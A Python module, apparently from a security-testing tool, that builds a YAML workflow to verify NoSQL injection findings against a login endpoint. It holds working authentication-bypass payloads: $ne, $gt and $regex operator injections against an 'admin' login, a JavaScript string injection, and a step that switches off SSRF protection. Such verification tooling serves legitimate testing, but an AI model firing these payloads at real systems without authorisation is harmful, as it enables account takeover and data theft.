"""NoSQL injection test blueprint — generates flyto-core YAML.

Targets Mongo-style query injection. Oracle: when the server accepts
`{"$ne": null}` or `{"$gt": ""}` in place of a string, it returns records
that a normal request (wrong password) would never return — so the probe's
response body contains significantly more data than baseline.
"""
from __future__ import annotations

import yaml

from ..schema import SecurityFinding


def generate(finding: SecurityFinding, target_url: str, auth_token: str | None) -> str:
    method = (finding.http_method or "POST").upper()
    param = finding.param_name or "password"
    path = finding.endpoint_path or "/login"
    url = f"{target_url}{path}"

    baseline_body = {param: "wrong-password-xyz", "username": "admin"}
    # Operator payloads — all valid JSON that real NoSQL drivers interpret.
    operator_payloads = [
        {"username": "admin", param: {"$ne": None}},
        {"username": "admin", param: {"$gt": ""}},
        {"username": {"$regex": ".*"}, param: {"$regex": ".*"}},
    ]
    # String injection against Mongo shell / Express middleware
    string_payloads = [
        {param: "'; return true; var x='", "username": "admin"},
    ]

    headers = {"Content-Type": "application/json"}
    if auth_token:
        headers["Authorization"] = f"Bearer {auth_token}"

    probe_requests = [{"method": method, "url": url, "headers": headers, "body": baseline_body, "label": "baseline_wrong_pw"}]
    for i, body in enumerate(operator_payloads, 1):
        probe_requests.append({"method": method, "url": url, "headers": headers, "body": body, "label": f"op_{i}"})
    for i, body in enumerate(string_payloads, 1):
        probe_requests.append({"method": method, "url": url, "headers": headers, "body": body, "label": f"str_{i}"})

    workflow = {
        "id": f"verify_nosql_{param}",
        "name": f"NoSQL Injection Verify: {param} at {path}",
        "version": "1.0.0",
        "description": f"Auto-generated NoSQLi verification at {finding.source_file}:{finding.source_line}",
        "timeout": 120,
        "steps": [
            {"id": "start", "module": "flow.start", "label": "Start", "params": {}, "orderIndex": 0},
            {
                "id": "nosql_probes",
                "module": "http.batch",
                "label": "NoSQL Injection Probes",
                "params": {
                    "description": "Baseline (wrong password) + 4 NoSQL operator / string payloads",
                    "requests": probe_requests,
                    "timeout": 10,
                    "ssrf_protection": False,
                },
                "orderIndex": 1,
            },
            # Oracle: baseline returns 401/invalid; successful injection flips to
            # 200 with a session token. test.assert_status detects the status flip.
            {
                "id": "assert_nosql_status",
                "module": "test.assert_status",
                "label": "Assert Auth Flipped",
                "params": {
                    "source": "${nosql_probes.items}",
                    "baseline_index": 0,
                    "probe_indices": [1, 2, 3, 4],
                    # Baseline returns e.g. 401; injection that works returns 200.
                    # If probe status == 200 (matches a *successful* response),
                    # that's a bypass — reuse assert_status semantics.
                    "expected_blocked": [401, 403, 422],
                    "on_bypass": "exploitable",
                    "on_blocked": "sanitized",
                },
                "orderIndex": 2,
            },
            {
                "id": "report",
                "module": "output.display",
                "label": "Report",
                "params": {
                    "format": "json",
                    "data": {
                        "result": "${assert_nosql_status.data}",
                        "finding_source": f"{finding.source_file}:{finding.source_line}",
                        "finding_sink": f"{finding.sink_file}:{finding.sink_line}",
                    },
                },
                "orderIndex": 3,
            },
        ],
        "edges": [
            {"source": "start", "target": "nosql_probes"},
            {"source": "nosql_probes", "target": "assert_nosql_status"},
            {"source": "assert_nosql_status", "target": "report"},
        ],
    }
    return yaml.dump(workflow, default_flow_style=False, allow_unicode=True, sort_keys=False)
